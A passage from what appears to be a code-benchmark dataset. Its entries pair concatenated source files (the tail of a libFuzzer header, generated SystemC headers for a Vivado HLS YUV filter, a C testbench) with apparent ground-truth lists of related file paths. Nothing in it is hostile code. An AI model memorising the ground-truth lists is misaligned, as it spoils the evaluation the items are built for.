(Counter >= 128) Bit = 7;\n    else if (Counter >= 32) Bit = 6;\n    else if (Counter >= 16) Bit = 5;\n    else if (Counter >= 8) Bit = 4;\n    else if (Counter >= 4) Bit = 3;\n    else if (Counter >= 3) Bit = 2;\n    else if (Counter >= 2) Bit = 1;\n    return Bit;\n}\n\ntemplate <class Callback>\nATTRIBUTE_NO_SANITIZE_ADDRESS\nATTRIBUTE_NOINLINE\nvoid TracePC::CollectFeatures(Callback HandleFeature) const {\n  auto Handle8bitCounter = [&](size_t FirstFeature,\n                               size_t Idx, uint8_t Counter) {\n    if (UseCounters)\n      HandleFeature(FirstFeature + Idx * 8 + CounterToFeature(Counter));\n    else\n      HandleFeature(FirstFeature + Idx);\n  };\n\n  size_t FirstFeature = 0;\n\n  for (size_t i = 0; i < NumModules; i++) {\n    for (size_t r = 0; r < Modules[i].NumRegions; r++) {\n      if (!Modules[i].Regions[r].Enabled) continue;\n      FirstFeature += 8 * ForEachNonZeroByte(Modules[i].Regions[r].Start,\n                                             Modules[i].Regions[r].Stop,\n                                             FirstFeature, Handle8bitCounter);\n    }\n  }\n\n  FirstFeature +=\n      8 * ForEachNonZeroByte(ExtraCountersBegin(), ExtraCountersEnd(),\n                             FirstFeature, Handle8bitCounter);\n\n  if (UseValueProfileMask) {\n    ValueProfileMap.ForEach([&](size_t Idx) {\n      HandleFeature(FirstFeature + Idx);\n    });\n    FirstFeature += ValueProfileMap.SizeInBits();\n  }\n\n\n  auto StackDepthStepFunction = [](uint32_t A) -> uint32_t {\n    if (!A) return A;\n    uint32_t Log2 = Log(A);\n    if (Log2 < 3) return A;\n    Log2 -= 3;\n    return (Log2 + 1) * 8 + ((A >> Log2) & 7);\n  };\n  assert(StackDepthStepFunction(1024) == 64);\n  assert(StackDepthStepFunction(1024 * 4) == 80);\n  assert(StackDepthStepFunction(1024 * 1024) == 144);\n\n  if (auto MaxStackOffset = GetMaxStackOffset())\n    HandleFeature(FirstFeature + StackDepthStepFunction(MaxStackOffset / 8));\n}\n\nextern TracePC TPC;\n\n}\n\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltinsMsvc.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerTracePC.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'"
        ]
    },
    {
        "files": [
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv2rgb.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter_test.c'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter.h'",
            "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter_mac_mug8j.h'"
        ],
        "content": "'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv2rgb.h'\n:\n\n\n\n\n\n\n#ifndef _yuv2rgb_HH_\n#define _yuv2rgb_HH_\n\n#include \"systemc.h\"\n#include \"AESL_pkg.h\"\n\n#include \"yuv_filter_ama_adeOg.h\"\n#include \"yuv_filter_mac_mufYi.h\"\n#include \"yuv_filter_mac_mug8j.h\"\n\nnamespace ap_rtl {\n\nstruct yuv2rgb : public sc_module {\n\n    sc_in_clk ap_clk;\n    sc_in< sc_logic > ap_rst;\n    sc_in< sc_logic > ap_start;\n    sc_out< sc_logic > ap_done;\n    sc_out< sc_logic > ap_idle;\n    sc_out< sc_logic > ap_ready;\n    sc_out< sc_lv<22> > in_channels_ch1_address0;\n    sc_out< sc_logic > in_channels_ch1_ce0;\n    sc_in< sc_lv<8> > in_channels_ch1_q0;\n    sc_out< sc_lv<22> > in_channels_ch2_address0;\n    sc_out< sc_logic > in_channels_ch2_ce0;\n    sc_in< sc_lv<8> > in_channels_ch2_q0;\n    sc_out< sc_lv<22> > in_channels_ch3_address0;\n    sc_out< sc_logic > in_channels_ch3_ce0;\n    sc_in< sc_lv<8> > in_channels_ch3_q0;\n    sc_in< sc_lv<16> > in_width_read;\n    sc_in< sc_lv<16> > in_height_read;\n    sc_out< sc_lv<22> > out_channels_ch1_address0;\n    sc_out< sc_logic > out_channels_ch1_ce0;\n    sc_out< sc_logic > out_channels_ch1_we0;\n    sc_out< sc_lv<8> > out_channels_ch1_d0;\n    sc_out< sc_lv<22> > out_channels_ch2_address0;\n    sc_out< sc_logic > out_channels_ch2_ce0;\n    sc_out< sc_logic > out_channels_ch2_we0;\n    sc_out< sc_lv<8> > out_channels_ch2_d0;\n    sc_out< sc_lv<22> > out_channels_ch3_address0;\n    sc_out< sc_logic > out_channels_ch3_ce0;\n    sc_out< sc_logic > out_channels_ch3_we0;\n    sc_out< sc_lv<8> > out_channels_ch3_d0;\n    sc_out< sc_lv<16> > ap_return_0;\n    sc_out< sc_lv<16> > ap_return_1;\n    sc_signal< sc_lv<18> > ap_var_for_const0;\n    sc_signal< sc_lv<18> > ap_var_for_const1;\n\n\n\n    yuv2rgb(sc_module_name name);\n    SC_HAS_PROCESS(yuv2rgb);\n\n    ~yuv2rgb();\n\n    sc_trace_file* mVcdFile;\n\n    yuv_filter_ama_adeOg<1,1,5,8,18,18,18>* yuv_filter_ama_adeOg_U15;\n    yuv_filter_mac_mufYi<1,1,10,8,18,18>* yuv_filter_mac_mufYi_U16;\n    yuv_filter_mac_mug8j<1,1,8,8,17,17>* yuv_filter_mac_mug8j_U17;\n    sc_signal< sc_lv<10> > ap_CS_fsm;\n    sc_signal< sc_logic > ap_CS_fsm_state1;\n    sc_signal< sc_lv<16> > x_1_fu_225_p2;\n    sc_signal< sc_lv<16> > x_1_reg_580;\n    sc_signal< sc_logic > ap_CS_fsm_state2;\n    sc_signal< sc_lv<23> > tmp_s_fu_255_p2;\n    sc_signal< sc_lv<23> > tmp_s_reg_585;\n    sc_signal< sc_lv<1> > exitcond1_fu_220_p2;\n    sc_signal< sc_lv<16> > y_1_fu_276_p2;\n    sc_signal< sc_lv<16> > y_1_reg_593;\n    sc_signal< sc_logic > ap_CS_fsm_state3;\n    sc_signal< sc_lv<64> > tmp_21_cast_fu_291_p1;\n    sc_signal< sc_lv<64> > tmp_21_cast_reg_598;\n    sc_signal< sc_lv<1> > exitcond_fu_271_p2;\n    sc_signal< sc_logic > ap_CS_fsm_state4;\n    sc_signal< sc_lv<8> > Y_reg_622;\n    sc_signal< sc_logic > ap_CS_fsm_state6;\n    sc_signal< sc_lv<8> > D_fu_299_p2;\n    sc_signal< sc_lv<8> > D_reg_627;\n    sc_signal< sc_logic > ap_CS_fsm_state7;\n    sc_signal< sc_lv<8> > E_fu_305_p2;\n    sc_signal< sc_lv<8> > E_reg_634;\n    sc_signal< sc_lv<18> > grp_fu_537_p4;\n    sc_signal< sc_lv<18> > tmp_3_reg_639;\n    sc_signal< sc_lv<17> > tmp_13_fu_315_p2;\n    sc_signal< sc_lv<17> > tmp_13_reg_646;\n    sc_signal< sc_lv<8> > R_fu_369_p3;\n    sc_signal< sc_lv<8> > R_reg_651;\n    sc_signal< sc_logic > ap_CS_fsm_state8;\n    sc_signal< sc_lv<8> > G_fu_436_p3;\n    sc_signal< sc_lv<8> > G_reg_656;\n    sc_signal< sc_lv<8> > B_fu_529_p3;\n    sc_signal< sc_lv<8> > B_reg_661;\n    sc_signal< sc_logic > ap_CS_fsm_state9;\n    sc_signal< sc_lv<16> > x_reg_198;\n    sc_signal< sc_lv<16> > y_reg_209;\n    sc_signal< sc_logic > ap_CS_fsm_state10;\n    sc_signal< sc_logic > ap_CS_fsm_state5;\n    sc_signal< sc_lv<13> > tmp_fu_231_p1;\n    sc_signal< sc_lv<15> > tmp_5_fu_243_p1;\n    sc_signal< sc_lv<23> > p_shl2_cast_fu_235_p3;\n    sc_signal< sc_lv<23> > p_shl3_cast_fu_247_p3;\n    sc_signal< sc_lv<23> > tmp_cast_fu_282_p1;\n    sc_signal< sc_lv<23> > tmp_6_fu_286_p2;\n    sc_signal< sc_lv<8> > tmp_13_fu_315_p1;\n    sc_signal< sc_lv<18> > grp_fu_547_p3;\n    sc_signal< sc_lv<2> > tmp_8_fu_324_p4;\n    sc_signal< sc_lv<1> > icmp_fu_333_p2;\n    sc_signal< sc_lv<1> > tmp_10_fu_339_p3;\n    sc_signal< sc_lv<1> > tmp_11_fu_363_p2;\n    sc_signal< sc_lv<8> > p_phitmp_fu_355_p3;\n    sc_signal< sc_lv<8> > phitmp_fu_346_p4;\n    sc_signal< sc_lv<17> > grp_fu_557_p3;\n    sc_signal< sc_lv<18> > tmp1_cast_fu_380_p1;\n    sc_signal< sc_lv<18> > tmp_14_fu_383_p2;\n    sc_signal< sc_lv<2> > tmp_15_fu_388_p4;\n    sc_signal< sc_lv<1> > icmp9_fu_398_p2;\n    sc_signal< sc_lv<1> > tmp_16_fu_404_p3;\n    sc_signal< sc_lv<1> > tmp_17_fu_430_p2;\n    sc_signal< sc_lv<8> > p_phitmp2_fu_422_p3;\n    sc_signal< sc_lv<8> > phitmp2_fu_412_p4;\n    sc_signal< sc_lv<17> > p_shl_fu_444_p3;\n    sc_signal< sc_lv<10> > p_shl1_fu_455_p3;\n    sc_signal< sc_lv<18> > p_shl1_cast_fu_462_p1;\n    sc_signal< sc_lv<18> > tmp2_fu_466_p2;\n    sc_signal< sc_lv<19> > tmp2_cast_fu_471_p1;\n    sc_signal< sc_lv<19> > p_shl_cast_fu_451_p1;\n    sc_signal< sc_lv<19> > tmp_18_fu_475_p2;\n    sc_signal< sc_lv<3> > tmp_19_fu_481_p4;\n    sc_signal< sc_lv<1> > icmp1_fu_491_p2;\n    sc_signal< sc_lv<1> > tmp_20_fu_497_p3;\n    sc_signal< sc_lv<1> > tmp_21_fu_523_p2;\n    sc_signal< sc_lv<8> > p_phitmp3_fu_515_p3;\n    sc_signal< sc_lv<8> > phitmp3_fu_505_p4;\n    sc_signal< sc_lv<5> > grp_fu_537_p0;\n    sc_signal< sc_lv<8> > grp_fu_537_p1;\n    sc_signal< sc_lv<10> > grp_fu_547_p0;\n    sc_signal< sc_lv<8> > grp_fu_557_p0;\n    sc_signal< sc_lv<10> > ap_NS_fsm;\n    sc_signal< sc_lv<9> > grp_fu_537_p10;\n    static const sc_logic ap_const_logic_1;\n    static const sc_logic ap_const_logic_0;\n    static const sc_lv<10> ap_ST_fsm_state1;\n    static const sc_lv<10> ap_ST_fsm_state2;\n    static const sc_lv<10> ap_ST_fsm_state3;\n    static const sc_lv<10> ap_ST_fsm_state4;\n    static const sc_lv<10> ap_ST_fsm_state5;\n    static const sc_lv<10> ap_ST_fsm_state6;\n    static const sc_lv<10> ap_ST_fsm_state7;\n    static const sc_lv<10> ap_ST_fsm_state8;\n    static const sc_lv<10> ap_ST_fsm_state9;\n    static const sc_lv<10> ap_ST_fsm_state10;\n    static const sc_lv<32> ap_const_lv32_0;\n    static const sc_lv<32> ap_const_lv32_1;\n    static const sc_lv<1> ap_const_lv1_0;\n    static const sc_lv<32> ap_const_lv32_2;\n    static const sc_lv<32> ap_const_lv32_3;\n    static const sc_lv<32> ap_const_lv32_5;\n    static const sc_lv<32> ap_const_lv32_6;\n    static const sc_lv<32> ap_const_lv32_7;\n    static const sc_lv<32> ap_const_lv32_8;\n    static const sc_lv<16> ap_const_lv16_0;\n    static const sc_lv<1> ap_const_lv1_1;\n    static const sc_lv<32> ap_const_lv32_9;\n    static const sc_lv<32> ap_const_lv32_4;\n    static const sc_lv<16> ap_const_lv16_1;\n    static const sc_lv<10> ap_const_lv10_0;\n    static const sc_lv<8> ap_const_lv8_0;\n    static const sc_lv<8> ap_const_lv8_80;\n    static const sc_lv<17> ap_const_lv17_1FF30;\n    static const sc_lv<32> ap_const_lv32_10;\n    static const sc_lv<32> ap_const_lv32_11;\n    static const sc_lv<2> ap_const_lv2_1;\n    static const sc_lv<32> ap_const_lv32_F;\n    static const sc_lv<8> ap_const_lv8_FF;\n    static const sc_lv<9> ap_const_lv9_0;\n    static const sc_lv<2> ap_const_lv2_0;\n    static const sc_lv<32> ap_const_lv32_12;\n    static const sc_lv<3> ap_const_lv3_0;\n    static const sc_lv<9> ap_const_lv9_1F0;\n    static const sc_lv<18> ap_const_lv18_12A;\n    static const sc_lv<18> ap_const_lv18_80;\n    static const sc_lv<18> ap_const_lv18_199;\n    static const sc_lv<16> ap_const_lv16_FF9C;\n    static const bool ap_const_boolean_1;\n\n    void thread_ap_var_for_const0();\n    void thread_ap_var_for_const1();\n    void thread_ap_clk_no_reset_();\n    void thread_B_fu_529_p3();\n    void thread_D_fu_299_p2();\n    void thread_E_fu_305_p2();\n    void thread_G_fu_436_p3();\n    void thread_R_fu_369_p3();\n    void thread_ap_CS_fsm_state1();\n    void thread_ap_CS_fsm_state10();\n    void thread_ap_CS_fsm_state2();\n    void thread_ap_CS_fsm_state3();\n    void thread_ap_CS_fsm_state4();\n    void thread_ap_CS_fsm_state5();\n    void thread_ap_CS_fsm_state6();\n    void thread_ap_CS_fsm_state7();\n    void thread_ap_CS_fsm_state8();\n    void thread_ap_CS_fsm_state9();\n    void thread_ap_done();\n    void thread_ap_idle();\n    void thread_ap_ready();\n    void thread_ap_return_0();\n    void thread_ap_return_1();\n    void thread_exitcond1_fu_220_p2();\n    void thread_exitcond_fu_271_p2();\n    void thread_grp_fu_537_p0();\n    void thread_grp_fu_537_p1();\n    void thread_grp_fu_537_p10();\n    void thread_grp_fu_547_p0();\n    void thread_grp_fu_557_p0();\n    void thread_icmp1_fu_491_p2();\n    void thread_icmp9_fu_398_p2();\n    void thread_icmp_fu_333_p2();\n    void thread_in_channels_ch1_address0();\n    void thread_in_channels_ch1_ce0();\n    void thread_in_channels_ch2_address0();\n    void thread_in_channels_ch2_ce0();\n    void thread_in_channels_ch3_address0();\n    void thread_in_channels_ch3_ce0();\n    void thread_out_channels_ch1_address0();\n    void thread_out_channels_ch1_ce0();\n    void thread_out_channels_ch1_d0();\n    void thread_out_channels_ch1_we0();\n    void thread_out_channels_ch2_address0();\n    void thread_out_channels_ch2_ce0();\n    void thread_out_channels_ch2_d0();\n    void thread_out_channels_ch2_we0();\n    void thread_out_channels_ch3_address0();\n    void thread_out_channels_ch3_ce0();\n    void thread_out_channels_ch3_d0();\n    void thread_out_channels_ch3_we0();\n    void thread_p_phitmp2_fu_422_p3();\n    void thread_p_phitmp3_fu_515_p3();\n    void thread_p_phitmp_fu_355_p3();\n    void thread_p_shl1_cast_fu_462_p1();\n    void thread_p_shl1_fu_455_p3();\n    void thread_p_shl2_cast_fu_235_p3();\n    void thread_p_shl3_cast_fu_247_p3();\n    void thread_p_shl_cast_fu_451_p1();\n    void thread_p_shl_fu_444_p3();\n    void thread_phitmp2_fu_412_p4();\n    void thread_phitmp3_fu_505_p4();\n    void thread_phitmp_fu_346_p4();\n    void thread_tmp1_cast_fu_380_p1();\n    void thread_tmp2_cast_fu_471_p1();\n    void thread_tmp2_fu_466_p2();\n    void thread_tmp_10_fu_339_p3();\n    void thread_tmp_11_fu_363_p2();\n    void thread_tmp_13_fu_315_p1();\n    void thread_tmp_13_fu_315_p2();\n    void thread_tmp_14_fu_383_p2();\n    void thread_tmp_15_fu_388_p4();\n    void thread_tmp_16_fu_404_p3();\n    void thread_tmp_17_fu_430_p2();\n    void thread_tmp_18_fu_475_p2();\n    void thread_tmp_19_fu_481_p4();\n    void thread_tmp_20_fu_497_p3();\n    void thread_tmp_21_cast_fu_291_p1();\n    void thread_tmp_21_fu_523_p2();\n    void thread_tmp_5_fu_243_p1();\n    void thread_tmp_6_fu_286_p2();\n    void thread_tmp_8_fu_324_p4();\n    void thread_tmp_cast_fu_282_p1();\n    void thread_tmp_fu_231_p1();\n    void thread_tmp_s_fu_255_p2();\n    void thread_x_1_fu_225_p2();\n    void thread_y_1_fu_276_p2();\n    void thread_ap_NS_fsm();\n};\n\n}\n\nusing namespace ap_rtl;\n\n#endif\n\n'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter_test.c'\n:#include <stdio.h>\n\n#include <stdlib.h>\n\n#include \"yuv_filter.h\"\n\n\n\nint main () {\n\n\n\n\n\n   image_t *img_rgb = (image_t *)malloc(sizeof(image_t));\n\n   image_t *img_restore = (image_t *)malloc(sizeof(image_t));\n\n\n\n\n\n   image_read(img_rgb);\n\n\n\n\n\n\n\n   yuv_filter(img_rgb, img_restore, 128, 128, 128);\n\n\n\n\n\n   image_write(img_restore);\n\n\n\n\n\n   int ret = system(\"diff --brief -w test_data/output.dat test_data/output.golden.dat\");\n\n\n\n   if (ret != 0) {\n\n      printf(\"Test failed!!!\\n\", ret);\n\n      return 1;\n\n   } else {\n\n      printf(\"Test passed!\\n\", ret);\n\n      return 0;\n\n   }\n\n}\n\n\n\n\n'High-Level-Synthesis-Flow-on-Zynq-using-Vivado-HLS/source/lab2/yuv_filter.prj/solution1/syn/systemc/yuv_filter.h'\n:\n\n\n\n\n\n\n#ifndef _yuv_filter_HH_\n#define _yuv_filter_HH_\n\n#include \"systemc.h\"\n#include \"AESL_pkg.h\"\n\n#include \"rgb2yuv.h\"\n#include \"yuv2rgb.h\"\n#include \"yuv_filter_p_yuv_hbi.h\"\n\nnamespace ap_rtl {\n\nstruct yuv_filter : public sc_module {\n\n    sc_in_clk ap_clk;\n    sc_in< sc_logic > ap_rst;\n    sc_in< sc_logic > ap_start;\n    sc_out< sc_logic > ap_done;\n    sc_out< sc_logic > ap_idle;\n    sc_out< sc_logic > ap_ready;\n    sc_out< sc_lv<22> > in_channels_ch1_address0;\n    sc_out< sc_logic > in_channels_ch1_ce0;\n    sc_in< sc_lv<8> > in_channels_ch1_q0;\n    sc_out< sc_lv<22> > in_channels_ch2_address0;\n    sc_out< sc_logic > in_channels_ch2_ce0;\n    sc_in< sc_lv<8> > in_channels_ch2_q0;\n    sc_out< sc_lv<22> > in_channels_ch3_address0;\n    sc_out< sc_logic > in_channels_ch3_ce0;\n    sc_in< sc_lv<8> > in_channels_ch3_q0;\n    sc_in< sc_lv<16> > in_width;\n    sc_in< sc_lv<16> > in_height;\n    sc_out< sc_lv<22> > out_channels_ch1_address0;\n    sc_out< sc_logic > out_channels_ch1_ce0;\n    sc_out< sc_logic > out_channels_ch1_we0;\n    sc_out< sc_lv<8> > out_channels_ch1_d0;\n    sc_out< sc_lv<22> > out_channels_ch2_address0;\n    sc_out< sc_logic > out_channels_ch2_ce0;\n    sc_out< sc_logic > out_channels_ch2_we0;\n    sc_out< sc_lv<8> > out_channels_ch2_d0;\n    sc_out< sc_lv<22> > out_channels_ch3_address0;\n    sc_out< sc_logic > out_channels_ch3_ce0;\n    sc_out< sc_logic > out_channels_ch3_we0;\n    sc_out< sc_lv<8> > out_channels_ch3_d0;\n    sc_out< sc_lv<16> > out_width;\n    sc_out< sc_logic > out_width_ap_vld;\n    sc_out< sc_lv<16> > out_height;\n    sc_out< sc_logic > out_height_ap_vld;\n    sc_in< sc_lv<8> > Y_scale;\n    sc_in< sc_lv<8> > U_scale;\n    sc_in< sc_lv<8> > V_scale;\n\n\n\n    yuv_filter(sc_module_name name);\n    SC_HAS_PROCESS(yuv_filter);\n\n    ~yuv_filter();\n\n    sc_trace_file* mVcdFile;\n\n    ofstream mHdltvinHandle;\n    ofstream mHdltvoutHandle;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch1_U;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch2_U;\n    yuv_filter_p_yuv_hbi* p_yuv_channels_ch3_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch1_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch2_U;\n    yuv_filter_p_yuv_hbi* p_scale_channels_ch3_U;\n    rgb2yuv* grp_rgb2yuv_fu_250;\n    yuv2rgb* grp_yuv2rgb_fu_270;\n    sc_signal< sc_lv<10> > ap_CS_fsm;\n    sc_signal< sc_logic > ap_CS_fsm_state1;\n    sc_signal< sc_lv<16> > p_yuv_width_reg_450;\n    sc_signal< sc_logic > ap_CS_fsm_state2;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_idle;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_ready;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_done;\n    sc_signal< sc_lv<16> > p_yuv_height_reg_456;\n    sc_signal< sc_lv<15> > tmp_i_cast_fu_293_p1;\n    sc_signal< sc_lv<15> > tmp_i_cast_reg_462;\n    sc_signal< sc_lv<15> > tmp_1_i_cast_fu_297_p1;\n    sc_signal< sc_lv<15> > tmp_1_i_cast_reg_467;\n    sc_signal< sc_lv<15> > tmp_2_i_cast_fu_301_p1;\n    sc_signal< sc_lv<15> > tmp_2_i_cast_reg_472;\n    sc_signal< sc_lv<16> > x_fu_310_p2;\n    sc_signal< sc_lv<16> > x_reg_480;\n    sc_signal< sc_logic > ap_CS_fsm_state3;\n    sc_signal< sc_lv<23> > tmp_2_fu_340_p2;\n    sc_signal< sc_lv<23> > tmp_2_reg_485;\n    sc_signal< sc_lv<1> > exitcond1_i_fu_305_p2;\n    sc_signal< sc_lv<16> > y_fu_351_p2;\n    sc_signal< sc_lv<16> > y_reg_493;\n    sc_signal< sc_logic > ap_CS_fsm_state4;\n    sc_signal< sc_lv<64> > tmp_3_cast_fu_366_p1;\n    sc_signal< sc_lv<64> > tmp_3_cast_reg_498;\n    sc_signal< sc_lv<1> > exitcond_i_fu_346_p2;\n    sc_signal< sc_lv<8> > tmp_10_i_reg_520;\n    sc_signal< sc_logic > ap_CS_fsm_state7;\n    sc_signal< sc_lv<8> > tmp_11_i_reg_525;\n    sc_signal< sc_lv<8> > tmp_12_i_reg_530;\n    sc_signal< sc_logic > ap_CS_fsm_state8;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch1_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch1_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch1_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch1_q0;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch2_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch2_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch2_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch2_q0;\n    sc_signal< sc_lv<22> > p_yuv_channels_ch3_address0;\n    sc_signal< sc_logic > p_yuv_channels_ch3_ce0;\n    sc_signal< sc_logic > p_yuv_channels_ch3_we0;\n    sc_signal< sc_lv<8> > p_yuv_channels_ch3_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch1_address0;\n    sc_signal< sc_logic > p_scale_channels_ch1_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch1_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch1_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch2_address0;\n    sc_signal< sc_logic > p_scale_channels_ch2_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch2_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch2_q0;\n    sc_signal< sc_lv<22> > p_scale_channels_ch3_address0;\n    sc_signal< sc_logic > p_scale_channels_ch3_ce0;\n    sc_signal< sc_logic > p_scale_channels_ch3_we0;\n    sc_signal< sc_lv<8> > p_scale_channels_ch3_q0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_start;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch1_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch1_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch2_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch2_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_in_channels_ch3_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_in_channels_ch3_ce0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch1_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch1_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch1_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch1_d0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch2_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch2_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch2_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch2_d0;\n    sc_signal< sc_lv<22> > grp_rgb2yuv_fu_250_out_channels_ch3_address0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch3_ce0;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_out_channels_ch3_we0;\n    sc_signal< sc_lv<8> > grp_rgb2yuv_fu_250_out_channels_ch3_d0;\n    sc_signal< sc_lv<16> > grp_rgb2yuv_fu_250_ap_return_0;\n    sc_signal< sc_lv<16> > grp_rgb2yuv_fu_250_ap_return_1;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_start;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_done;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_idle;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_ready;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch1_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch1_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch2_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch2_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_in_channels_ch3_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_in_channels_ch3_ce0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch1_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch1_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch1_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch1_d0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch2_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch2_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch2_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch2_d0;\n    sc_signal< sc_lv<22> > grp_yuv2rgb_fu_270_out_channels_ch3_address0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch3_ce0;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_out_channels_ch3_we0;\n    sc_signal< sc_lv<8> > grp_yuv2rgb_fu_270_out_channels_ch3_d0;\n    sc_signal< sc_lv<16> > grp_yuv2rgb_fu_270_ap_return_0;\n    sc_signal< sc_lv<16> > grp_yuv2rgb_fu_270_ap_return_1;\n    sc_signal< sc_lv<16> > x_i_reg_228;\n    sc_signal< sc_lv<16> > y_i_reg_239;\n    sc_signal< sc_logic > ap_CS_fsm_state9;\n    sc_signal< sc_logic > grp_rgb2yuv_fu_250_ap_start_reg;\n    sc_signal< sc_logic > grp_yuv2rgb_fu_270_ap_start_reg;\n    sc_signal< sc_logic > ap_CS_fsm_state10;\n    sc_signal< sc_logic > ap_CS_fsm_state5;\n    sc_signal< sc_logic > ap_CS_fsm_state6;\n    sc_signal< sc_lv<13> > tmp_fu_316_p1;\n    sc_signal< sc_lv<15> > tmp_1_fu_328_p1;\n    sc_signal< sc_lv<23> > p_shl_cast_fu_320_p3;\n    sc_signal< sc_lv<23> > p_shl3_cast_fu_332_p3;\n    sc_signal< sc_lv<23> > tmp_5_i_cast_fu_357_p1;\n    sc_signal< sc_lv<23> > tmp_3_fu_361_p2;\n    sc_signal< sc_lv<8> > tmp_7_i_fu_377_p0;\n    sc_signal< sc_lv<8> > tmp_7_i_fu_377_p1;\n    sc_signal< sc_lv<8> > tmp_i_fu_386_p0;\n    sc_signal< sc_lv<8> > tmp_i_fu_386_p1;\n    sc_signal< sc_lv<8> > tmp_8_i_fu_395_p0;\n    sc_signal< sc_lv<8> > tmp_8_i_fu_395_p1;\n    sc_signal< sc_lv<15> > tmp_7_i_fu_377_p2;\n    sc_signal< sc_lv<15> > tmp_i_fu_386_p2;\n    sc_signal< sc_lv<15> > tmp_8_i_fu_395_p2;\n    sc_signal< sc_lv<10> > ap_NS_fsm;\n    sc_signal< sc_lv<15> > tmp_7_i_fu_377_p10;\n    sc_signal< sc_lv<15> > tmp_8_i_fu_395_p10;\n    